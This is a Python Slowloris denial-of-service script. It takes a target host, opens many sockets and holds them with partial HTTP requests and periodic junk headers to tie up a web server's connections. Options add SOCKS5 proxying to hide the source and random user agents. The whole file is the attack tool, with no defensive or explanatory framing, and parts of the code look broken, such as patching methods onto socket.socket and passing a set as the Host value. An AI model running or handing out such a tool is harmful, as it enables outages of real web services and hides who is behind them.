from scapy.all import *
import socket
import sys
from random import *
import os
import argparse
import time
import socks

def main():
    parser = argparse.ArgumentParser(description= 'slowloris programmed in python')
    parser.add_argument("host", help="target ip")
    parser.add_argument(
            '-p',
            help='host port, usually 80 for webservers',
            default=80,
            dest='port',
            type=int
            )
    parser.add_argument(
            '-s',
            help='number of sockets to open',
            default= 1,
            dest='sockets',
            type=int
            )

            
    parser.add_argument(
            "-x", "--useproxy",
            dest="useproxy",
            action="store_true",
            help="Use a SOCKS5 proxy for connecting",
            )

    parser.add_argument(
            '-H','--proxy-host',
            help='host address of SOCKS5 proxy',
            dest = 'proxyhost',
            type= str
            )

    parser.add_argument(
            '-P','--proxy-port',
            help='host port of SOCKS5 proxy',
            dest = 'proxyport',
            type=int
            )

    parser.add_argument(
            '-ua', '--user-agent', '--user-agents',
            dest='randagent',
            action="store_true",
            help='use a random user agent'
            )
    
    parser.add_argument(
            '-d', '--delay',
            dest='delay',
            help='delay between iterations',
            default = 5.0,
            type = float
            )


    
                
    sockets = []
    args = parser.parse_args()

    if args.useproxy:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxyhost, args.proxyport)
        socket.socket = socks.socksocket

    status('initializing...')
    for i in range(0, args.sockets):
        s = init_socket(args)
        sockets.append(s)

    while True:
        out = iteration(sockets, args)
        status(out)
        time.sleep(args.delay)
        
        

def status(message):
    os.system('cls')
    print(message)


def load_agents(name):
        agentlist = []
        with open(name, 'r') as file:
              for i in file.readlines():
                    agentlist.append(i)
        return agentlist

def send_header(self, field, option):
      self.send((f'{field}: {option}\n').encode('utf-8'))


def init_socket(args):
    port = args.port
    dst = socket.gethostbyname(args.host)
    try:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((dst, port))
        s.send((f"GET / HTTP/1.1\n").encode('utf-8'))
        s.send_header('Host', {dst})
        if args.randagent:
            agents = load_agents('agents.txt')
            s.send_header('User-Agent', choice(agents))
    except Exception as s:
                print(s)
                pass
    return s



def iteration(list, args):
    dead = 0
    alive = len(list)
    out = []
    out.append(f'{alive} alive')
    for i in list:
        try:
            i.send_header('X-a', str(randint(0, 5000)))
        except socket.error:

            list.remove(i)
            dead += 1
    out.append(f'sent {alive-dead} headers, {dead} unresponsive')
    
    out.append(f'reviving {dead} dead sockets')
    for i in range(0, dead):
        s = init_socket(args)
        list.append(s)
    alive = len(list)
    out.append(f'revived all dead sockets, {alive} alive')
    return '\n'.join(out)

setattr(socket.socket, 'send_header', send_header)
main()